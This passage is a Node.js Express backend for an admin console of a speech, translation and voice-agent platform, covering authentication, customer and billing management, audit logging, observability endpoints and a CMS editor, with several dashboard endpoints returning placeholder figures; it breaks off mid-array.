const path = require("path");
const crypto = require("crypto");
const dns = require("dns");
const express = require("express");
const cors = require("cors");
const cookieParser = require("cookie-parser");
const jwt = require("jsonwebtoken");
const bcrypt = require("bcryptjs");
const { MongoClient } = require("mongodb");

require("dotenv").config({ path: path.join(__dirname, ".env") });

if (typeof dns.setDefaultResultOrder === "function") {
  dns.setDefaultResultOrder("ipv4first");
}

const mongoUrl = process.env.MONGO_URL;
const dbName = process.env.DB_NAME;
const jwtSecret = process.env.JWT_SECRET;
const port = Number(process.env.PORT || 8001);
const host = process.env.HOST || "0.0.0.0";
const corsOrigins = (process.env.CORS_ORIGINS || "*").split(",").map((s) => s.trim());
const useCustomMongoDns = process.env.MONGO_FORCE_CUSTOM_DNS === "true";
const mongoDnsServers = (useCustomMongoDns ? process.env.MONGO_DNS_SERVERS || "" : "")
  .split(",")
  .map((s) => s.trim())
  .filter(Boolean);
const scheduleTickSeconds = Number(
  process.env.CMS_SCHEDULER_TICK_SECONDS || process.env.CMS_SCHEDULE_TICK_SECONDS || 30
);

if (!mongoUrl || !dbName || !jwtSecret) {
  throw new Error("MONGO_URL, DB_NAME and JWT_SECRET are required");
}

if (mongoDnsServers.length) {
  dns.setServers(mongoDnsServers);
}

function redactMongoUrl(url) {
  try {
    const parsed = new URL(url);
    if (parsed.password) parsed.password = "****";
    return parsed.toString();
  } catch {
    return url.replace(/\/\/([^:/@]+):([^@]+)@/, "//$1:****@");
  }
}

const app = express();
const client = new MongoClient(mongoUrl);
let db;
let server;
let scheduler;

const workerState = {
  last_run: null,
  runs: 0,
  auto_published: 0,
};

app.use(express.json({ limit: "2mb" }));
app.use(cookieParser());
app.use(
  cors({
    origin(origin, cb) {
      if (!origin || corsOrigins.includes("*") || corsOrigins.includes(origin)) return cb(null, true);
      return cb(null, false);
    },
    credentials: true,
  })
);

const nowIso = () => new Date().toISOString();
const randInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
const pick = (items) => items[randInt(0, items.length - 1)];
const weightedPick = (items, weights) => {
  const total = weights.reduce((sum, n) => sum + n, 0);
  let roll = Math.random() * total;
  for (let i = 0; i < items.length; i += 1) {
    roll -= weights[i];
    if (roll <= 0) return items[i];
  }
  return items[items.length - 1];
};
const daysAgo = (days) => new Date(Date.now() - days * 86400000).toISOString();
const hoursAgo = (hours) => new Date(Date.now() - hours * 3600000).toISOString();
const minutesAgo = (minutes) => new Date(Date.now() - minutes * 60000).toISOString();
const ymd = (date) => date.toISOString().slice(0, 10);
const publicDoc = (doc) => {
  if (!doc) return doc;
  const { _id, password_hash, ...rest } = doc;
  return rest;
};
const publicDocs = (docs) => docs.map(publicDoc);

function createAccessToken(uid, email) {
  return jwt.sign({ sub: uid, email, type: "access" }, jwtSecret, { expiresIn: "12h" });
}

async function getAdminFromToken(token) {
  try {
    const payload = jwt.verify(token, jwtSecret);
    const user = await db.collection("admins").findOne({ id: payload.sub }, { projection: { _id: 0, password_hash: 0 } });
    return user || null;
  } catch {
    return null;
  }
}

async function requireAdmin(req, res, next) {
  const header = req.get("authorization") || "";
  const token = req.cookies.access_token || (header.startsWith("Bearer ") ? header.slice(7) : null);
  if (!token) return res.status(401).json({ detail: "Not authenticated" });
  try {
    const payload = jwt.verify(token, jwtSecret);
    const user = await db.collection("admins").findOne({ id: payload.sub }, { projection: { _id: 0, password_hash: 0 } });
    if (!user) return res.status(401).json({ detail: "User not found" });
    req.admin = user;
    return next();
  } catch (err) {
    return res.status(401).json({ detail: err.name === "TokenExpiredError" ? "Token expired" : "Invalid token" });
  }
}

async function writeAudit(admin, action, target, before = null, after = null, ip = "-", meta = {}) {
  await db.collection("audit_logs").insertOne({
    id: `AUD-${crypto.randomBytes(6).toString("hex")}`,
    admin_id: admin.id,
    admin_name: admin.name,
    admin_email: admin.email,
    action,
    target,
    before,
    after,
    ip,
    meta,
    created_at: nowIso(),
  });
}

function audit(req, action, target, before = null, after = null, meta = {}) {
  return writeAudit(req.admin, action, target, before, after, req.ip || "-", meta);
}

const asyncRoute = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const api = express.Router();

api.post("/auth/login", asyncRoute(async (req, res) => {
  const email = String(req.body.email || "").toLowerCase();
  const user = await db.collection("admins").findOne({ email });
  const ok = user && bcrypt.compareSync(String(req.body.password || ""), user.password_hash);
  if (!ok) return res.status(401).json({ detail: "Invalid email or password" });
  const token = createAccessToken(user.id, email);
  res.cookie("access_token", token, {
    httpOnly: true,
    secure: true,
    sameSite: "none",
    maxAge: 43200 * 1000,
    path: "/",
  });
  return res.json({ id: user.id, email, name: user.name, role: user.role, token });
}));

api.post("/auth/logout", (req, res) => {
  res.clearCookie("access_token", { path: "/" });
  res.json({ success: true });
});

api.get("/auth/me", requireAdmin, (req, res) => res.json(req.admin));

api.use(requireAdminExceptSse);

function requireAdminExceptSse(req, res, next) {
  if (req.path === "/dashboard/live-activity/stream") return next();
  return requireAdmin(req, res, next);
}

api.get("/dashboard/overview", (req, res) => {
  res.json({
    today_revenue: 128450.75,
    platform_credits: 984.58,
    credits_sold: 345890,
    total_customers: 2843,
    active_customers: 2456,
    new_registrations: 312,
    total_api_requests: 532100,
    successful_requests: 525200,
    failed_requests: 6900,
    active_api_keys: 4586,
    live_voice_sessions: 128,
    live_chat_sessions: 342,
    cb_paluku_usage: 128400,
    cb_vinu_usage: 96700,
    cb_vaaradhi_usage: 76500,
    cb_thodu_usage: 42100,
    system_health: "operational",
    pending_tickets: 18,
    alerts: 5,
    revenue_change: 18.6,
    customers_change: 12.4,
    requests_change: 14.2,
  });
});

function snapshotLiveActivity() {
  return {
    requests_per_second: randInt(120, 180),
    active_api_calls: randInt(400, 600),
    live_stt_sessions: randInt(20, 60),
    live_tts_requests: randInt(30, 80),
    live_translations: randInt(15, 50),
    live_chat_agents: randInt(200, 400),
    live_voice_agents: randInt(80, 150),
    current_queue: randInt(0, 20),
    errors: randInt(2, 15),
    ts: nowIso(),
    recent_activity: [
      { time: "just now", customer: pick(["TechNova Solutions", "Voxify AI", "LinguaVerse", "ChatterWise"]), action: pick(["API call to CB Paluku", "New voice session started", "Translation batch", "Chat session", "Voice clone approved"]) },
      { time: "2s ago", customer: "Voxify AI", action: "New voice session started" },
      { time: "5s ago", customer: "LinguaVerse", action: "Translation batch" },
      { time: "8s ago", customer: "ChatterWise", action: "Chat session" },
    ],
  };
}

api.get("/dashboard/live-activity", (req, res) => res.json(snapshotLiveActivity()));

api.get("/dashboard/live-activity/stream", asyncRoute(async (req, res) => {
  const admin = await getAdminFromToken(String(req.query.token || ""));
  if (!admin) return res.status(401).json({ detail: "Invalid or expired token" });
  res.writeHead(200, {
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache, no-transform",
    "X-Accel-Buffering": "no",
    Connection: "keep-alive",
  });
  res.write(`event: hello\ndata: ${JSON.stringify({ admin: admin.email, ts: nowIso(), heartbeat_ms: 15000 })}\n\n`);
  let tickCount = 0;
  const interval = setInterval(() => {
    tickCount += 1;
    res.write(`event: tick\ndata: ${JSON.stringify(snapshotLiveActivity())}\n\n`);
    if (tickCount % 7 === 0) res.write(`event: heartbeat\ndata: ${JSON.stringify({ ts: nowIso() })}\n\n`);
  }, 2000);
  req.on("close", () => clearInterval(interval));
}));

api.get("/dashboard/revenue", (req, res) => {
  res.json({
    daily: 128450.75,
    weekly: 892340.5,
    monthly: 3845000,
    annual: 42580000,
    credits_revenue: 2145000,
    subscription_revenue: 1450000,
    observability_revenue: 250000,
    refund_amount: 42500,
    outstanding: 128000,
    top_customers: [
      { name: "TechNova Solutions", amount: 482500 },
      { name: "Voxify AI Pvt Ltd", amount: 361200 },
      { name: "Global TransTech", amount: 285600 },
      { name: "InnoTalk Systems", amount: 245080 },
      { name: "LinguaVerse", amount: 218902 },
    ],
    by_service: [
      { service: "CB Paluku", amount: 1245000 },
      { service: "CB Vinu", amount: 985000 },
      { service: "CB Vaaradhi", amount: 745000 },
      { service: "CB Thodu", amount: 870000 },
    ],
  });
});

api.get("/dashboard/system-status", (req, res) => {
  res.json({
    services: [
      { name: "CB Paluku", status: "operational", latency: 142, uptime: 99.98 },
      { name: "CB Vinu", status: "operational", latency: 218, uptime: 99.95 },
      { name: "CB Vaaradhi", status: "operational", latency: 98, uptime: 99.99 },
      { name: "CB Thodu", status: "operational", latency: 320, uptime: 99.92 },
      { name: "API Gateway", status: "operational", latency: 25, uptime: 100 },
      { name: "Database", status: "operational", latency: 8, uptime: 100 },
      { name: "Storage", status: "operational", latency: 45, uptime: 99.99 },
      { name: "GPU Cluster", status: "degraded", latency: 520, uptime: 98.5 },
      { name: "Queue", status: "operational", latency: 12, uptime: 100 },
    ],
    current_latency: 156,
    error_rate: 1.34,
    incidents: [{ id: "INC-2091", title: "GPU cluster latency spike", severity: "minor", started: "12 mins ago" }],
  });
});

api.get("/customers", asyncRoute(async (req, res) => {
  let customers = await db.collection("customers").find({}, { projection: { _id: 0 } }).toArray();
  const q = String(req.query.q || "").toLowerCase();
  if (q) customers = customers.filter((c) => String(c.name || "").toLowerCase().includes(q) || String(c.email || "").toLowerCase().includes(q));
  if (req.query.status) customers = customers.filter((c) => c.status === req.query.status);
  if (req.query.plan) customers = customers.filter((c) => c.plan === req.query.plan);
  res.json({ total: customers.length, customers });
}));

api.get("/customers/:cid", asyncRoute(async (req, res) => {
  const customer = await db.collection("customers").findOne({ id: req.params.cid }, { projection: { _id: 0 } });
  if (!customer) return res.status(404).json({ detail: "Customer not found" });
  return res.json(customer);
}));

api.post("/customers/:cid/action", asyncRoute(async (req, res) => {
  const action = req.body.action;
  const valid = new Set(["activate", "suspend", "block", "reset_password", "verify", "delete"]);
  if (!valid.has(action)) return res.status(400).json({ detail: "Invalid action" });
  const existing = await db.collection("customers").findOne({ id: req.params.cid }, { projection: { _id: 0 } });
  if (!existing) return res.status(404).json({ detail: "Customer not found" });
  const updates = {};
  if (action === "activate") updates.status = "active";
  if (action === "suspend") updates.status = "suspended";
  if (action === "block") updates.status = "blocked";
  if (Object.keys(updates).length) await db.collection("customers").updateOne({ id: req.params.cid }, { $set: updates });
  await audit(req, `customer.${action}`, `${existing.name} (${req.params.cid})`, { status: existing.status }, Object.keys(updates).length ? updates : { note: action }, { reason: req.body.reason || "" });
  res.json({ success: true, action });
}));

api.post("/customers/:cid/credits", asyncRoute(async (req, res) => {
  const delta = Number.parseInt(req.body.delta || 0, 10);
  const reason = req.body.reason || "";
  if (delta === 0) return res.status(400).json({ detail: "Delta must be non-zero" });
  if (!reason) return res.status(400).json({ detail: "Reason required" });
  const existing = await db.collection("customers").findOne({ id: req.params.cid }, { projection: { _id: 0 } });
  if (!existing) return res.status(404).json({ detail: "Customer not found" });
  const before = existing.credits_balance || 0;
  const after = before + delta;
  if (after < 0) return res.status(400).json({ detail: "Insufficient credits" });
  await db.collection("customers").updateOne({ id: req.params.cid }, { $set: { credits_balance: after } });
  await db.collection("credit_transactions").insertOne({
    id: `CRT-${crypto.randomBytes(4).toString("hex").toUpperCase()}`,
    customer: existing.name,
    type: delta > 0 ? "adjustment" : "usage",
    description: `Manual adjustment by admin: ${reason}`,
    credits: delta,
    balance: after,
    reference: `ADMIN-${req.admin.id.slice(0, 8)}`,
    date: nowIso(),
    by: req.admin.name || "Admin",
  });
  await audit(req, "credit.adjust", `${existing.name} (${req.params.cid})`, { credits_balance: before }, { credits_balance: after }, { delta, reason });
  res.json({ success: true, before, after });
}));

api.post("/customers/:cid/plan", asyncRoute(async (req, res) => {
  const valid = new Set(["Free", "Starter", "Pro", "Enterprise", "Custom"]);
  const newPlan = req.body.plan;
  if (!valid.has(newPlan)) return res.status(400).json({ detail: "Plan must be one of ['Custom', 'Enterprise', 'Free', 'Pro', 'Starter']" });
  const existing = await db.collection("customers").findOne({ id: req.params.cid }, { projection: { _id: 0 } });
  if (!existing) return res.status(404).json({ detail: "Customer not found" });
  if (existing.plan === newPlan) return res.json({ success: true, message: "No change" });
  await db.collection("customers").updateOne({ id: req.params.cid }, { $set: { plan: newPlan } });
  await audit(req, "plan.change", `${existing.name} (${req.params.cid})`, { plan: existing.plan }, { plan: newPlan }, { reason: req.body.reason || "" });
  res.json({ success: true, before: existing.plan, after: newPlan });
}));

api.post("/billing/refund", asyncRoute(async (req, res) => {
  const txnId = req.body.transaction_id;
  const amount = Number(req.body.amount || 0);
  const reason = req.body.reason || "";
  if (!txnId || amount <= 0 || !reason) return res.status(400).json({ detail: "transaction_id, amount>0 and reason are required" });
  const txn = await db.collection("transactions").findOne({ id: txnId }, { projection: { _id: 0 } });
  if (!txn) return res.status(404).json({ detail: "Transaction not found" });
  if (amount > txn.amount) return res.status(400).json({ detail: "Refund exceeds original amount" });
  const refundId = `RFN-${crypto.randomBytes(4).toString("hex").toUpperCase()}`;
  await db.collection("refunds").insertOne({ id: refundId, transaction_id: txnId, customer: txn.customer, amount, reason, status: "processed", processed_by: req.admin.name, created_at: nowIso() });
  await audit(req, "billing.refund", `${txn.customer} - Txn ${txnId}`, { transaction_amount: txn.amount, refunded: 0 }, { transaction_amount: txn.amount, refunded: amount }, { refund_id: refundId, reason });
  res.json({ success: true, refund_id: refundId });
}));

api.get("/plans", asyncRoute(async (req, res) => res.json(await db.collection("plans").find({}, { projection: { _id: 0 } }).toArray())));
api.get("/subscriptions", asyncRoute(async (req, res) => res.json(await db.collection("subscriptions").find({}, { projection: { _id: 0 } }).toArray())));
api.get("/billing/payments", (req, res) => res.json({
  successful: 8452,
  failed: 128,
  pending: 42,
  refunded: 65,
  revenue: 3845000,
  by_method: [
    { method: "UPI", count: 4200, amount: 1450000 },
    { method: "Credit Card", count: 2800, amount: 1620000 },
    { method: "Net Banking", count: 980, amount: 520000 },
    { method: "Wallet", count: 472, amount: 255000 },
  ],
}));
api.get("/billing/transactions", asyncRoute(async (req, res) => res.json(await db.collection("transactions").find({}, { projection: { _id: 0 } }).sort({ date: -1 }).limit(200).toArray())));
api.get("/billing/invoices", asyncRoute(async (req, res) => res.json(await db.collection("invoices").find({}, { projection: { _id: 0 } }).limit(200).toArray())));
api.get("/credits/overview", (req, res) => res.json({ issued: 5842000, consumed: 3245000, expired: 145000, bonus: 285000, remaining_liability: 2452000 }));
api.get("/credits/transactions", asyncRoute(async (req, res) => res.json(await db.collection("credit_transactions").find({}, { projection: { _id: 0 } }).sort({ date: -1 }).limit(200).toArray())));
api.get("/api-keys", asyncRoute(async (req, res) => res.json(await db.collection("api_keys").find({}, { projection: { _id: 0 } }).limit(200).toArray())));

api.get("/services/:service", (req, res) => {
  const data = {
    paluku: { name: "CB Paluku", type: "Text-to-Speech", requests: 128400, audio_generated: "18450 min", spend: 245800, latency: 142, errors: 128, active_voices: 42 },
    vinu: { name: "CB Vinu", type: "Speech-to-Text", requests: 96700, audio_minutes: "24680 min", accuracy: 96.8, latency: 218, errors: 84, languages: 18 },
    vaaradhi: { name: "CB Vaaradhi", type: "Translation", requests: 76500, characters: "8.4M", language_pairs: 342, latency: 98, quality: 94.2, errors: 42 },
    thodu: { name: "CB Thodu", type: "Chat & Voice Agent", chat_sessions: 24680, voice_sessions: 12430, minutes: 145000, tokens: "12.4M", cost: 582100, success_rate: 92.8 },
  };
  if (!data[req.params.service]) return res.status(404).json({ detail: "Service not found" });
  return res.json(data[req.params.service]);
});

api.get("/voices", asyncRoute(async (req, res) => res.json(await db.collection("voices").find({}, { projection: { _id: 0 } }).limit(200).toArray())));
api.get("/languages", (req, res) => res.json([
  { code: "te", name: "Telugu", status: "active", native_script: true, roman: true, quality: 96 },
  { code: "hi", name: "Hindi", status: "active", native_script: true, roman: true, quality: 97 },
  { code: "en", name: "English", status: "active", native_script: true, roman: false, quality: 98 },
  { code: "ta", name: "Tamil", status: "active", native_script: true, roman: true, quality: 95 },
  { code: "kn", name: "Kannada", status: "active", native_script: true, roman: true, quality: 94 },
  { code: "ml", name: "Malayalam", status: "active", native_script: true, roman: true, quality: 93 },
  { code: "bn", name: "Bengali", status: "active", native_script: true, roman: true, quality: 94 },
  { code: "mr", name: "Marathi", status: "beta", native_script: true, roman: true, quality: 88 },
  { code: "gu", name: "Gujarati", status: "beta", native_script: true, roman: true, quality: 87 },
  { code: "pa", name: "Punjabi", status: "beta", native_script: true, roman: true, quality: 86 },
  { code: "or", name: "Odia", status: "disabled", native_script: true, roman: false, quality: 78 },
]));
api.get("/users", asyncRoute(async (req, res) => res.json(await db.collection("org_users").find({}, { projection: { _id: 0 } }).limit(200).toArray())));

api.get("/admins", asyncRoute(async (req, res) => {
  const admins = await db.collection("admins").find({}, { projection: { _id: 0, password_hash: 0 } }).limit(50).toArray();
  for (const admin of admins) admin.actions_30d = await db.collection("audit_logs").countDocuments({ admin_id: admin.id });
  res.json(admins);
}));

api.get("/admins/me", asyncRoute(async (req, res) => {
  const logs = await db.collection("audit_logs").find({ admin_id: req.admin.id }, { projection: { _id: 0 } }).sort({ created_at: -1 }).limit(10).toArray();
  const allLogs = await db.collection("audit_logs").find({ admin_id: req.admin.id }, { projection: { _id: 0, action: 1 } }).limit(1000).toArray();
  const counts = allLogs.reduce((acc, item) => ({ ...acc, [item.action]: (acc[item.action] || 0) + 1 }), {});
  res.json({ ...req.admin, activity: logs, total_actions: allLogs.length, top_actions: Object.entries(counts).map(([action, count]) => ({ action, count })).sort((a, b) => b.count - a.count).slice(0, 5) });
}));

api.get("/admins/:admin_id", asyncRoute(async (req, res) => {
  const admin = await db.collection("admins").findOne({ id: req.params.admin_id }, { projection: { _id: 0, password_hash: 0 } });
  if (!admin) return res.status(404).json({ detail: "Admin not found" });
  const logs = await db.collection("audit_logs").find({ admin_id: req.params.admin_id }, { projection: { _id: 0 } }).sort({ created_at: -1 }).limit(50).toArray();
  const counts = logs.reduce((acc, item) => ({ ...acc, [item.action]: (acc[item.action] || 0) + 1 }), {});
  admin.activity = logs;
  admin.action_breakdown = Object.entries(counts).map(([action, count]) => ({ action, count })).sort((a, b) => b.count - a.count);
  admin.total_actions = logs.length;
  res.json(admin);
}));

api.post("/voices/:voice_id/approve", asyncRoute(async (req, res) => {
  const voice = await db.collection("voices").findOne({ id: req.params.voice_id }, { projection: { _id: 0 } });
  if (!voice) return res.status(404).json({ detail: "Voice not found" });
  if (voice.status === "active") return res.json({ success: true, message: "Already approved" });
  await db.collection("voices").updateOne({ id: req.params.voice_id }, { $set: { status: "active" } });
  await audit(req, "voice.approve", `${voice.name} - ${voice.language} (${req.params.voice_id})`, { status: voice.status }, { status: "active" }, { reason: req.body.reason || "Passed compliance review" });
  res.json({ success: true });
}));

api.post("/voices/:voice_id/reject", asyncRoute(async (req, res) => {
  if (!req.body.reason) return res.status(400).json({ detail: "Reason required for rejection" });
  const voice = await db.collection("voices").findOne({ id: req.params.voice_id }, { projection: { _id: 0 } });
  if (!voice) return res.status(404).json({ detail: "Voice not found" });
  await db.collection("voices").updateOne({ id: req.params.voice_id }, { $set: { status: "rejected" } });
  await audit(req, "voice.reject", `${voice.name} - ${voice.language} (${req.params.voice_id})`, { status: voice.status }, { status: "rejected" }, { reason: req.body.reason });
  res.json({ success: true });
}));

api.post("/incidents", asyncRoute(async (req, res) => {
  const { title, impact = "" } = req.body;
  const severity = req.body.severity || "minor";
  const affected = req.body.affected || [];
  if (!title) return res.status(400).json({ detail: "Title required" });
  if (!["minor", "major", "critical", "planned"].includes(severity)) return res.status(400).json({ detail: "Invalid severity" });
  const incident = { id: `INC-${2100 + await db.collection("incidents").countDocuments({})}`, title, severity, affected, impact, status: "investigating", started: "just now", created_at: nowIso(), created_by: req.admin.name };
  await db.collection("incidents").insertOne(incident);
  await audit(req, "incident.create", `${title} (${incident.id})`, null, { severity, affected, impact }, { incident_id: incident.id });
  res.json({ success: true, incident: publicDoc(incident) });
}));

api.put("/plans/:plan_id", asyncRoute(async (req, res) => {
  const existing = await db.collection("plans").findOne({ id: req.params.plan_id }, { projection: { _id: 0 } });
  if (!existing) return res.status(404).json({ detail: "Plan not found" });
  const allowed = new Set(["monthly", "annual", "credits", "api_limit", "concurrency", "support"]);
  const updates = {};
  for (const [key, value] of Object.entries(req.body)) if (allowed.has(key)) updates[key] = value;
  if (!Object.keys(updates).length) return res.status(400).json({ detail: "No valid fields to update" });
  const before = Object.fromEntries(Object.keys(updates).map((key) => [key, existing[key]]));
  await db.collection("plans").updateOne({ id: req.params.plan_id }, { $set: updates });
  await audit(req, "plan.edit", `${existing.name} plan (${req.params.plan_id})`, before, updates);
  res.json({ success: true, before, after: updates });
}));

api.get("/coupons", asyncRoute(async (req, res) => res.json(await db.collection("coupons").find({}, { projection: { _id: 0 } }).sort({ created_at: -1 }).limit(200).toArray())));
api.post("/coupons", asyncRoute(async (req, res) => {
  const code = String(req.body.code || "").toUpperCase().trim();
  const discountType = req.body.discount_type || "percentage";
  const discountValue = req.body.discount_value;
  if (!code || !discountValue) return res.status(400).json({ detail: "code and discount_value required" });
  if (!["percentage", "flat"].includes(discountType)) return res.status(400).json({ detail: "discount_type must be percentage or flat" });
  if (await db.collection("coupons").findOne({ code })) return res.status(409).json({ detail: "Coupon code already exists" });
  const coupon = { id: `CPN-${crypto.randomBytes(4).toString("hex").toUpperCase()}`, code, discount_type: discountType, discount_value: Number(discountValue), max_uses: Number.parseInt(req.body.max_uses || 100, 10), used: 0, eligible_plans: req.body.eligible_plans || [], valid_until: req.body.valid_until, status: "active", created_at: nowIso(), created_by: req.admin.name };
  await db.collection("coupons").insertOne(coupon);
  await audit(req, "coupon.issue", `Coupon ${code} (${coupon.id})`, null, { code, discount_type: discountType, discount_value: discountValue, max_uses: coupon.max_uses }, { eligible_plans: coupon.eligible_plans, valid_until: coupon.valid_until });
  res.json({ success: true, coupon: publicDoc(coupon) });
}));

api.get("/support/tickets", asyncRoute(async (req, res) => res.json(await db.collection("tickets").find({}, { projection: { _id: 0 } }).limit(200).toArray())));
api.get("/security/audit-logs", asyncRoute(async (req, res) => {
  const query = {};
  if (req.query.action) query.action = { $regex: String(req.query.action), $options: "i" };
  if (req.query.admin_id) query.admin_id = req.query.admin_id;
  const limit = Number.parseInt(req.query.limit || 100, 10);
  res.json(await db.collection("audit_logs").find(query, { projection: { _id: 0 } }).sort({ created_at: -1 }).limit(limit).toArray());
}));
api.post("/audit/sse-event", asyncRoute(async (req, res) => {
  const kind = req.body.kind;
  if (!["disconnect", "reconnect", "stale"].includes(kind)) return res.status(400).json({ detail: "kind must be disconnect, reconnect, or stale" });
  await audit(req, `sse.${kind}`, `live-activity stream (${req.body.session_id || "no-session"})`, null, { attempt: Number.parseInt(req.body.attempt || 0, 10) }, { reason: req.body.reason || "", session_id: req.body.session_id || "", kind });
  res.json({ success: true });
}));

api.get("/observability/voice-sessions", asyncRoute(async (req, res) => res.json(await db.collection("voice_sessions").find({}, { projection: { _id: 0 } }).sort({ started_at: -1 }).limit(200).toArray())));
api.get("/observability/voice-sessions/:sid", asyncRoute(async (req, res) => {
  const session = await db.collection("voice_sessions").findOne({ id: req.params.sid }, { projection: { _id: 0 } });
  if (!session) return res.status(404).json({ detail: "Session not found" });
  res.json(session);
}));
api.get("/observability/chat-sessions", asyncRoute(async (req, res) => res.json(await db.collection("chat_sessions").find({}, { projection: { _id: 0 } }).sort({ started_at: -1 }).limit(200).toArray())));
api.get("/observability/chat-sessions/:sid", asyncRoute(async (req, res) => {
  const session = await db.collection("chat_sessions").findOne({ id: req.params.sid }, { projection: { _id: 0 } });
  if (!session) return res.status(404).json({ detail: "Session not found" });
  res.json(session);
}));
api.get("/observability/pipeline/:sid", asyncRoute(async (req, res) => {
  const s = await db.collection("voice_sessions").findOne({ id: req.params.sid }, { projection: { _id: 0 } });
  if (!s) return res.status(404).json({ detail: "Session not found" });
  res.json({
    session_id: req.params.sid,
    customer: s.customer,
    started_at: s.started_at,
    duration_sec: s.duration_sec,
    input_audio_url: s.input_audio_url,
    output_audio_url: s.output_audio_url,
    transcript: s.transcript,
    translation: s.translation,
    agent_response: s.agent_response,
    voice_id: s.voice_id,
    tokens: s.tokens,
    stages: [
      { key: "input", label: "Input Audio", desc: `Original user audio - WAV - ${s.duration_sec}s`, meta: `${Math.round((s.duration_sec || 0) * 18)} KB - ${s.duration_sec}s` },
      { key: "stt", label: "STT - Vinu", desc: `Speech to text - ${String(s.language || "").split(" ")[0]} - 96.8% confidence`, meta: `${s.timeline[4].duration_ms}ms - ${s.tokens.input} tokens` },
      { key: "lang", label: "Language Detection", desc: `Detected: ${String(s.language || "").split(" ")[0]} (te-IN) - 99.1%`, meta: `${s.timeline[5].duration_ms}ms` },
      { key: "trans", label: "Translation - Vaaradhi", desc: `${s.language} - Quality: 94.2%`, meta: `${s.timeline[6].duration_ms}ms` },
      { key: "prompt", label: "LLM Prompt Assembly", desc: "System + context + user query composed", meta: `${s.tokens.input} tokens` },
      { key: "llm", label: "LLM Inference - Thodu", desc: "gpt-4.1 - temperature 0.7 - streaming", meta: `${s.timeline[7].duration_ms}ms - ${s.tokens.output} tokens` },
      { key: "tts", label: `TTS - Paluku (${s.voice_id || "default"})`, desc: `${String(s.language || "").split(" ")[0]} - warm style`, meta: `${s.timeline[8].duration_ms}ms` },
      { key: "output", label: "Output Audio", desc: "Final audio delivered to user", meta: `${Math.round((s.duration_sec || 0) * 8)} KB` },
    ],
  });
}));
api.get("/observability/traces", asyncRoute(async (req, res) => res.json(await db.collection("traces").find({}, { projection: { _id: 0, spans: 0 } }).sort({ created_at: -1 }).limit(50).toArray())));
api.get("/observability/traces/:tid", asyncRoute(async (req, res) => {
  const trace = await db.collection("traces").findOne({ id: req.params.tid }, { projection: { _id: 0 } });
  if (!trace) return res.status(404).json({ detail: "Trace not found" });
  res.json(trace);
}));
api.get("/observability/retention", (req, res) => res.json([
  { customer: "TechNova Solutions", audio_retention: "90 days", chat_retention: "365 days", log_retention: "365 days", audio_storage_gb: 128.4, custom: true },
  { customer: "Voxify AI Pvt Ltd", audio_retention: "30 days", chat_retention: "90 days", log_retention: "180 days", audio_storage_gb: 42.1, custom: true },
  { customer: "Global TransTech", audio_retention: "365 days", chat_retention: "365 days", log_retention: "365 days", audio_storage_gb: 245.8, custom: true },
  { customer: "LinguaVerse", audio_retention: "Do not store", chat_retention: "30 days", log_retention: "90 days", audio_storage_gb: 0, custom: false },
  { customer: "ChatterWise", audio_retention: "7 days", chat_retention: "30 days", log_retention: "90 days", audio_storage_gb: 8.4, custom: false },
]));
api.get("/observability/plans", (req, res) => res.json([
  { id: "obs_basic", name: "Basic", monthly: 0, retention_days: 7, audio_storage: false, session_replay: false, export: false, customers: 1820 },
  { id: "obs_pro", name: "Pro", monthly: 4999, retention_days: 30, audio_storage: true, session_replay: true, export: true, customers: 384 },
  { id: "obs_enterprise", name: "Enterprise", monthly: 24999, retention_days: 365, audio_storage: true, session_replay: true, export: true, customers: 42 },
]));
api.get("/observability/audio-storage", (req, res) => res.json({
  total_gb: 4245.8,
  input_gb: 2145.2,
  output_gb: 2100.6,
  monthly_cost: 84500,
  files: Array.from({ length: 20 }, () => ({ id: `aud_${crypto.randomBytes(5).toString("hex")}`, customer: pick(["TechNova", "Voxify AI", "LinguaVerse"]), duration: `${randInt(5, 300)}s`, size_mb: Math.round((Math.random() * 50 + 1) * 100) / 100, retention_days: pick([7, 30, 90, 365]), created: `${randInt(1, 60)} mins ago`, type: pick(["input", "output"]) })),
}));

api.get("/cms/pages", asyncRoute(async (req, res) => res.json(await db.collection("cms_pages").find({}, { projection: { _id: 0, body: 0, seo_title: 0, seo_description: 0 } }).sort({ updated_at: -1 }).limit(100).toArray())));
api.get("/cms/pages/:pid", asyncRoute(async (req, res) => {
  const page = await db.collection("cms_pages").findOne({ id: req.params.pid }, { projection: { _id: 0 } });
  if (!page) return res.status(404).json({ detail: "Page not found" });
  res.json(page);
}));
api.put("/cms/pages/:pid", asyncRoute(async (req, res) => {
  const action = req.body.action || "save";
  if (!["save", "publish", "schedule"].includes(action)) return res.status(400).json({ detail: "action must be save, publish, or schedule" });
  const existing = await db.collection("cms_pages").findOne({ id: req.params.pid }, { projection: { _id: 0 } });
  if (!existing) return res.status(404).json({ detail: "Page not found" });
  const editable = new Set(["title", "slug", "body", "seo_title", "seo_description"]);
  const updates = {};
  for (const [key, value] of Object.entries(req.body)) if (editable.has(key)) updates[key] = value;
  if (action === "publish") updates.status = "published";
  else if (action === "schedule") {
    updates.status = "scheduled";
    if (req.body.scheduled_at) updates.scheduled_at = req.body.scheduled_at;
  } else {
    updates.status = existing.status === "published" ? "published" : "draft";
  }
  updates.version = (existing.version || 1) + 1;
  updates.updated_at = nowIso();
  updates.last_editor = req.admin.name;
  const revision = { version: updates.version, author: req.admin.name, ts: updates.updated_at, changes: req.body.changes_summary || `Edited via ${action}` };
  await db.collection("cms_pages").updateOne({ id: req.params.pid }, { $set: updates, $push: { revisions: { $each: [revision], $position: 0 } } });
  const before = Object.fromEntries(Object.keys(updates).filter((key) => editable.has(key)).map((key) => [key, existing[key]]));
  const after = Object.fromEntries(Object.entries(updates).filter(([key]) => editable.has(key)));
  await audit(req, `cms.${action}`, `${existing.name || req.params.pid} (${req.params.pid})`, Object.keys(before).length ? before : { status: existing.status }, Object.keys(after).length ? after : { status: updates.status }, { version: updates.version, changes: revision.changes });
  res.json({ success: true, page: publicDoc(await db.collection("cms_pages").findOne({ id: req.params.pid })) });
}));

api.get("/broadcasts", (req, res) => res.json([
  { id: "bc_2091", name: "May Product Update", channel: "email", audience: "All customers", audience_size: 2843, sent: 2843, delivered: 2799, opened: 1245, clicked: 428, status: "sent", scheduled: null, sent_at: "1 day ago" },
  { id: "bc_2088", name: "Low Credits Reminder", channel: "email+sms", audience: "Low balance", audience_size: 128, sent: 128, delivered: 125, opened: 108, clicked: 42, status: "sent", scheduled: null, sent_at: "3 days ago" },
